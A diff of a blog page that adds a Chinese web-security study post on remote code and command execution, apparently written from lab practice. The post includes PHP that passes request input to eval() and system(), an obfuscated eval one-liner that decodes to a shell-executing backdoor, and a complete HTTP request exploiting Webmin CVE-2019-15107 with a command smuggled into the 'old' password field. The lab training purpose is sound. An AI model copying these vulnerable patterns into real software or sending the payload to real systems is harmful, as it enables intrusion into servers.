@@ -443,9 +443,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -466,14 +470,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    683
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    3 分
                 </div>
                 
 
@@ -493,7 +497,85 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-RCE代码及命令执行漏洞全解"><a href="#WEB漏洞-RCE代码及命令执行漏洞全解" class="headerlink" title="WEB漏洞-RCE代码及命令执行漏洞全解"></a><font size="6"><strong>WEB漏洞-RCE代码及命令执行漏洞全解</strong></font></h2><span id="more"></span>
+
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size="5"><strong>前言</strong></font></h3><p>前言： 在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代 码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏 洞。同样调用系统命令处理，将造成命令执行漏洞。<br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/1.png"></p>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><font size="5"><strong>PHP</strong></font></h3><p>eval()函数中的eval是evaluate的简称，这个函数的作用就是把一段字符串当作PHP语句来执行，一般情况下不建议使用容易被黑客利用。<br>在服务器上创建以下代码</p>
+<pre class=" language-bash"><code class="language-bash">root@ae63a3df5e26:/var/www/html<span class="token comment" spellcheck="true"># cat test.php</span>
+<span class="token operator">&lt;</span>?php
+        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        eval<span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/2.png"></p>
+<pre class=" language-bash"><code class="language-bash">root@ae63a3df5e26:/var/www/html<span class="token comment" spellcheck="true"># cat test.php</span>
+<span class="token operator">&lt;</span>?php
+        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> system<span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/3.png"></p>
+<p>形成漏洞的原因：可控变量，函数漏洞</p>
+<h3 id="pikachu-RCE"><a href="#pikachu-RCE" class="headerlink" title="pikachu RCE"></a><font size="5"><strong>pikachu RCE</strong></font></h3><p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/4.png"><br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/5.png"><br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/6.png"><br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/7.png"></p>
+<h3 id="mozhe"><a href="#mozhe" class="headerlink" title="mozhe"></a><font size="5"><strong>mozhe</strong></font></h3><p>PHP代码分析溯源(第4题)</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php 
+    echo<span class="token punctuation">(</span>gzinflate<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">"&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;"</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/8.png"></p>
+<p>靶场源代码</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php 
+    eval<span class="token punctuation">(</span>gzinflate<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">"&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;"</span><span class="token punctuation">))</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+?<span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/9.png"></p>
+<p><strong>说明：</strong>本来这是一个代码执行的漏洞但是由于代码含有echo <code>调用了系统命令而前面的echo正好将后面的 echo </code>打印出来，所以也就成一个代码执行漏洞变成了一个系统执行漏洞。<br>解码之后的代码也就是这样</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php 
+    eval<span class="token punctuation">(</span>echo <span class="token variable"><span class="token variable">`</span>$_REQUEST<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token variable">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+?<span class="token operator">></span>
+</code></pre>
+<h3 id="webadmin"><a href="#webadmin" class="headerlink" title="webadmin"></a><font size="5"><strong>webadmin</strong></font></h3><p><a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/webmin/CVE-2019-15107/">https://vulhub.org/#/environments/webmin/CVE-2019-15107/</a></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /opt/vulhub/vulhub-master/webmin/CVE-2019-15107
+docker-compose up -d
+</code></pre>
+<p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/10.png"></p>
+<p>root&#x2F;webmin<br><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/11.png"></p>
+<pre class=" language-bash"><code class="language-bash">POST /password_change.cgi HTTP/1.1
+Host: 10.1.1.7:10000
+Cookie: redirect<span class="token operator">=</span>1<span class="token punctuation">;</span> testing<span class="token operator">=</span>1<span class="token punctuation">;</span> sessiontest<span class="token operator">=</span>1<span class="token punctuation">;</span> sid<span class="token operator">=</span>x
+Content-Length: 60
+Cache-Control: max-age<span class="token operator">=</span>0
+Sec-Ch-Ua: <span class="token string">"Chromium"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"92"</span>, <span class="token string">" Not A;Brand"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"99"</span>, <span class="token string">"Google Chrome"</span><span class="token punctuation">;</span>v<span class="token operator">=</span><span class="token string">"92"</span>
+Sec-Ch-Ua-Mobile: ?0
+Upgrade-Insecure-Requests: 1
+Origin: https://10.1.1.7:10000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/92.0.4515.131 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,application/signed-exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://10.1.1.7:10000/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9
+Connection: close
+
+user<span class="token operator">=</span>rootxx<span class="token operator">&amp;</span>pam<span class="token operator">=</span><span class="token operator">&amp;</span>expired<span class="token operator">=</span>2<span class="token operator">&amp;</span>old<span class="token operator">=</span>test<span class="token operator">|</span><span class="token function">id</span><span class="token operator">&amp;</span>new1<span class="token operator">=</span>test2<span class="token operator">&amp;</span>new2<span class="token operator">=</span>test2
+</code></pre>
+<p><img src="/2023/10/13/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-030/12.png"></p>
+<h3 id="php敏感函数"><a href="#php敏感函数" class="headerlink" title="php敏感函数"></a><font size="5"><strong>php敏感函数</strong></font></h3><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a><font size="5"><strong>演示案例：</strong></font></h3><p>● 墨者靶场黑盒功能点命令执行-应用功能<br>● 墨者靶场白盒代码及命令执行-代码分析<br>● 墨者靶场黑盒层 RCE 漏洞检测-公开漏洞<br>● Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面<br>● 一句话 Webshell 后门原理代码执行-拓展说明  </p>
+<h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a><font size="5"><strong>涉及资源</strong></font></h3><pre class=" language-bash"><code class="language-bash">https://www.cnblogs.com/ermei/p/6689005.html
+
+http://blog.leanote.com/post/snowming/9da184ef24bd
+
+https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe
+
+https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe
+
+https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -556,7 +638,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -740,7 +826,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-文件操作之文件包含漏洞全解
                         
                     </div>
                     <div class="publish-info">
@@ -754,6 +840,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -777,7 +871,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            WEB漏洞-XSS跨站之WAF绕过及安全修复
+                            WEB漏洞-CSRF及SSRF漏洞案例讲解
                         
                     </div>
                     <div class="publish-info">
@@ -1036,7 +1130,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.5k</span>&nbsp;字
+                class="white-color">52.1k</span>&nbsp;字
             
             
             
